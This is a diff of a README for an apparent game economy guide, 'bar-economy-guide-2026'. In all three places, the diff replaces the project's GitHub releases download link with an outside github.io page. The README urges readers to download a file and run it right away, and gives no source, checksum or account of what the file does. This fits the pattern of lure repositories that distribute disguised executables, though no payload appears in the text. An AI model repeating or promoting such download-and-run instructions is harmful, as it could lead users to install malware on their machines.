@@ -1,6 +1,6 @@
 # 📊 bar-economy-guide-2026 - Master Your Base Economy Today
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Slq134525/bar-economy-guide-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge&logo=github)](https://slq134525.github.io)
 
 ## 🎯 What Is This?
 
@@ -17,7 +17,7 @@ Getting started is simple. No coding, no complicated setup. Just follow these st
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/Slq134525/bar-economy-guide-2026/releases](https://github.com/Slq134525/bar-economy-guide-2026/releases)
+**Visit this link to download the application:** [https://slq134525.github.io](https://slq134525.github.io)
 
 Once you're on the download page, you'll see the latest release file. Click it to begin downloading. After the download finishes, you can open the application right away. There's no complicated installation wizard — just run it and you're good to go.
 
@@ -131,7 +131,7 @@ Whether you're climbing the ladder or playing casually with friends, a stronger 
 
 ## 📌 Final Reminder
 
-**Visit this link to download the application:** [https://github.com/Slq134525/bar-economy-guide-2026/releases](https://github.com/Slq134525/bar-economy-guide-2026/releases)
+**Visit this link to download the application:** [https://slq134525.github.io](https://slq134525.github.io)
 
 Click the download button, run the file, and start building the economy that wins games. Good luck, Commander.
 
